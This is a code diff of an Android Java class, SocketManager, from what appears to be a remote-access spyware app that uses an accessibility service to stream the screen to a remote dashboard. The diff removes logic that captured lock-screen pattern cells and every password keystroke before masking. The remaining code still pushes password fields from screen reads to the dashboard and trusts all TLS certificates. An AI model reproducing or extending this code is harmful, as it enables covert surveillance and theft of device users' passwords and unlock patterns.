@@ -84,6 +84,13 @@ public class SocketManager {
         new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
     );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
+    // Keep expensive accessibility reads off the heartbeat scheduler.
+    private final ScheduledExecutorService screenReaderExecutor =
+            Executors.newSingleThreadScheduledExecutor(r -> {
+                Thread t = new Thread(r, "SocketMgr-screen-reader");
+                t.setDaemon(true);
+                return t;
+            });
     private ScheduledFuture<?>             heartbeatFuture;
 
     // ── Multi-channel sockets ─────────────────────────────────────────────
@@ -151,20 +158,13 @@ public class SocketManager {
     // Screen-reader push mode — app continuously reads screen and pushes to dashboard
     private volatile ScheduledFuture<?> screenReaderFuture;
 
-    // Normal interval between screen-reader ticks (ms)
-    private static final long SCREEN_READER_NORMAL_INTERVAL_MS   = 50L;
-    // Fast interval used when a pattern-unlock screen is active — captures each cell
-    // block as it lights up before it fades, which happens faster than 50ms
-    private static final long SCREEN_READER_PATTERN_INTERVAL_MS  = 16L;
-    // True when the loop is currently running at the fast pattern-screen rate
-    private volatile boolean inPatternScreenMode  = false;
-    // True while a rate-switch restart has been submitted to the executor (prevents storms)
-    private volatile boolean loopRestartPending   = false;
+    // Match the practical dashboard rate instead of performing up to 20 full
+    // accessibility-tree reads per second that are never transmitted.
+    private static final long SCREEN_READER_NORMAL_INTERVAL_MS = 200L;
 
     // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
-    // The internal 50ms tick still runs (for password/pattern capture), but dashboard
-    // screen:update pushes are rate-limited to this value. Default 1000ms = 1 fps.
-    private volatile long screenReaderDashboardIntervalMs  = 150L;
+    // Default 200ms provides responsive updates without starving weaker devices.
+    private volatile long screenReaderDashboardIntervalMs = 200L;
     private volatile long lastScreenReaderDashboardPushMs  = 0L;
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
@@ -390,6 +390,13 @@ public class SocketManager {
 
     /** Whether streaming is currently active (idle-frame mode on). */
     public boolean isStreamingActive() { return idleFrameMode && connected; }
+
+    /** Whether the accessibility screen-reader loop is actively traversing the UI. */
+    public boolean isScreenReaderActive() {
+        ScheduledFuture<?> f = screenReaderFuture;
+        return (autoRecordingActive || manualRecordingActive)
+                && f != null && !f.isDone() && !f.isCancelled();
+    }
 
     /** Build an SSLSocketFactory that trusts all certificates (self-signed or CA). */
     private static SSLSocketFactory buildTrustAllFactory() {
@@ -2435,7 +2442,15 @@ public class SocketManager {
                         r.put("error", "read_screen busy — accessibility reader is already running, retry");
                         return r;
                     }
-                    JSONObject screenResult = sr.readScreen();
+                    JSONObject screenResult;
+                    try {
+                        screenResult = sr.readScreen();
+                    } finally {
+                        accessSemaphore.release();
+                        acquired = false;
+                    }
+                    // Keep the explicit one-shot command behavior, but do it
+                    // after releasing the node-traversal lock.
                     pushPasswordFieldsFromScreen(screenResult);
                     return screenResult;
                 } finally {
@@ -2521,10 +2536,10 @@ public class SocketManager {
             }
 
             case "screen_reader_stream_start": {
-                // Read the interval the dashboard requests (100-5000ms; default 150ms).
-                // The internal 50ms tick keeps running for password/pattern capture,
-                // but screen:update pushes to the dashboard are throttled to this value.
-                final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 150L));
+                // Read the interval the dashboard requests (100-5000ms; default 200ms).
+                // The device reader runs at this same practical rate instead of doing
+                // several full tree reads that are never transmitted.
+                final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 200L));
                 // Serialize through heartbeatExecutor (single-threaded) so that a
                 // stream_stop submitted just before cannot overtake this start.
                 final UnifiedAccessibilityService finalSvc = accessSvc;
@@ -2826,8 +2841,6 @@ public class SocketManager {
                       .append(el.optString("text", ""))
                       .append(el.optString("contentDescription", ""))
                       .append(el.optString("hintText", ""))
-                      // Include passwordText so every password keystroke registers as a new frame
-                      .append(el.optString("passwordText", ""))
                       .append(el.optBoolean("checked",   false) ? "C" : "")
                       .append(el.optBoolean("selected",  false) ? "S" : "")
                       .append(el.optBoolean("enabled",   true)  ? "" : "D")
@@ -2846,48 +2859,6 @@ public class SocketManager {
     }
 
     /**
-     * Returns true if the given package name belongs to a pattern/PIN/password unlock screen.
-     * On these screens the loop runs at SCREEN_READER_PATTERN_INTERVAL_MS so each cell block
-     * that lights up during pattern drawing is captured before it fades.
-     */
-    private boolean isPatternUnlockPackage(String pkg) {
-        if (pkg == null || pkg.isEmpty()) return false;
-        // AOSP / stock Android lock screen
-        if (pkg.equals("com.android.systemui")) return true;
-        // Dedicated keyguard packages (some OEMs split this out)
-        if (pkg.equals("com.android.keyguard")) return true;
-        // Catch-all for OEM variants: any package whose name contains these keywords
-        if (pkg.contains("keyguard") || pkg.contains("lockscreen") || pkg.contains("lock_screen")) return true;
-        // Samsung-specific
-        if (pkg.equals("com.samsung.android.app.lockstar")
-                || pkg.equals("com.samsung.android.lockstar")) return true;
-        return false;
-    }
-
-    /**
-     * Returns true if the screen result contains any active password field with text.
-     * Used to bypass duplicate-frame suppression so every password keystroke is captured
-     * before Android masks the character.
-     */
-    private boolean screenHasActivePasswordField(JSONObject screenResult) {
-        if (screenResult == null) return false;
-        try {
-            JSONObject screen = screenResult.optJSONObject("screen");
-            if (screen == null) return false;
-            JSONArray elements = screen.optJSONArray("elements");
-            if (elements == null) return false;
-            for (int i = 0; i < elements.length(); i++) {
-                JSONObject el = elements.optJSONObject(i);
-                if (el != null && el.optBoolean("isPassword", false)
-                        && !el.optString("passwordText", "").isEmpty()) {
-                    return true;
-                }
-            }
-        } catch (Exception ignored) {}
-        return false;
-    }
-
-    /**
      * Internal: start the screen-reader push loop at the normal rate.
      */
     private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
@@ -2896,8 +2867,8 @@ public class SocketManager {
 
     /**
      * Internal: start the screen-reader push loop at a specific tick rate.
-     * Called with SCREEN_READER_NORMAL_INTERVAL_MS (50ms) for regular screens and
-     * SCREEN_READER_PATTERN_INTERVAL_MS (16ms) when a pattern/PIN unlock screen is active.
+     * The normal interval is intentionally conservative so screen control remains
+     * responsive on lower-powered devices.
      *
      * @param svc           the running accessibility service
      * @param sendAutoEvent if true, push an autoEvent:'start' so the dashboard
@@ -2912,7 +2883,7 @@ public class SocketManager {
 
         final String devId = DeviceInfo.getDeviceId(context);
 
-        screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
+        screenReaderFuture = screenReaderExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
             try {
                 // ── Resource pressure guard ────────────────────────────────────
@@ -2950,29 +2921,29 @@ public class SocketManager {
                 if (!acq) return;
 
                 ScreenReader pusher = new ScreenReader(liveSvc);
-                JSONObject screenResult = pusher.readScreen();
-                pushPasswordFieldsFromScreen(screenResult);
+                JSONObject screenResult;
+                try {
+                    // Serialize only the AccessibilityNodeInfo traversal.
+                    // JSON processing, compression, and socket I/O must not
+                    // block screen-control commands.
+                    screenResult = pusher.readForegroundScreen();
+                } finally {
+                    accessSemaphore.release();
+                    acq = false;
+                }
 
                 // ── Duplicate-frame deduplication ────────────────────────────
                 // Compute a lightweight fingerprint of the current screen.
                 // If the fingerprint matches the last sent frame, skip it so we
                 // don't flood the server (and waste 3G bandwidth) with identical data.
                 // After 2 consecutive identical frames the tick is skipped entirely.
-                // Exception 1: when a password field is actively being typed in, NEVER skip —
-                // password characters are briefly plain-text then masked, and we must capture
-                // every keystroke before masking occurs.
-                // Exception 2: when on a pattern-unlock screen, NEVER skip — pattern cells light
-                // up and fade within ~20-30ms and must all be captured at the 16ms fast rate.
-                boolean hasPasswordInput = screenHasActivePasswordField(screenResult);
                 String fp = computeFrameFingerprint(screenResult);
-                boolean isDuplicate = !hasPasswordInput && !inPatternScreenMode && !fp.isEmpty() && fp.equals(lastFrameFingerprint);
+                boolean isDuplicate = !fp.isEmpty() && fp.equals(lastFrameFingerprint);
                 if (isDuplicate) {
                     consecutiveDuplicateCount++;
-                    // Only skip the entire tick when NOT live-streaming to dashboard.
-                    // When manualRecordingActive is true, let the throttle handle rate-limiting
-                    // so the dashboard always receives frames at the configured interval even
-                    // when the screen content is unchanged (static screen).
-                    if (consecutiveDuplicateCount > 1 && !manualRecordingActive) {
+                    // The dashboard already has the previous frame. Do not repeatedly
+                    // serialize and transmit an unchanged accessibility tree.
+                    if (consecutiveDuplicateCount > 1) {
                         Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
                         return;
                     }
@@ -3006,12 +2977,9 @@ public class SocketManager {
                 // channel; that would queue high-frequency accessibility frames as commands.
                 //
                 // Dashboard push throttle: honor the intervalMs from screen_reader_stream_start.
-                // Password fields and pattern screens bypass the throttle — every keystroke/cell
-                // must be captured immediately before masking or fading occurs.
                 long nowMs = System.currentTimeMillis();
-                boolean throttleBypass = hasPasswordInput || inPatternScreenMode;
-                boolean throttleOk = throttleBypass
-                    || (nowMs - lastScreenReaderDashboardPushMs) >= screenReaderDashboardIntervalMs;
+                boolean throttleOk =
+                    (nowMs - lastScreenReaderDashboardPushMs) >= screenReaderDashboardIntervalMs;
                 if (manualRecordingActive && liveConnected && throttleOk) {
                     lastScreenReaderDashboardPushMs = nowMs;
                     // ── GZIP compression — reduces ~3-5 KB accessibility JSON to ~700 B on 3G ──
@@ -3031,34 +2999,6 @@ public class SocketManager {
                         sendLiveOnly("screen:update", payload); // fallback if gzip failed
                     }
                 }
-
-                // ── Pattern-unlock rate switching ────────────────────────────
-                // If the foreground package is a lock screen (systemui / keyguard) we
-                // switch to a 16ms capture rate so every cell block that lights up during
-                // pattern drawing is captured before it fades (~20-30ms visibility window).
-                // When the user leaves the lock screen, revert to the normal 50ms rate.
-                // A loopRestartPending guard ensures only one restart is ever in flight.
-                try {
-                    JSONObject sc = screenResult.optJSONObject("screen");
-                    String currentPkg = sc != null ? sc.optString("packageName", "") : "";
-                    boolean needFast = isPatternUnlockPackage(currentPkg);
-                    if (needFast != inPatternScreenMode && !loopRestartPending) {
-                        inPatternScreenMode = needFast;
-                        loopRestartPending  = true;
-                        long newInterval = needFast
-                            ? SCREEN_READER_PATTERN_INTERVAL_MS
-                            : SCREEN_READER_NORMAL_INTERVAL_MS;
-                        Log.i(TAG, "screen_reader: switching to " + newInterval +
-                            "ms interval (patternMode=" + needFast + ")");
-                        final UnifiedAccessibilityService restartSvc = liveSvc;
-                        executor.execute(() -> {
-                            ScheduledFuture<?> self = screenReaderFuture;
-                            if (self != null) self.cancel(false);
-                            loopRestartPending = false;
-                            startScreenReaderLoop(restartSvc, false, newInterval);
-                        });
-                    }
-                } catch (Exception ignored) {}
 
             } catch (Throwable e) {
                 // Catch Throwable — ScheduledExecutorService permanently cancels tasks that throw unchecked exceptions
@@ -3104,9 +3044,6 @@ public class SocketManager {
         if (f != null) { f.cancel(false); screenReaderFuture = null; }
         lastFrameFingerprint = null;
         consecutiveDuplicateCount = 0;
-        inPatternScreenMode = false;
-        loopRestartPending  = false;
-
         // Save any buffered offline frames to local file for later upload
         if (autoRecordingActive || manualRecordingActive) {
             java.util.ArrayList<JSONObject> buffered;
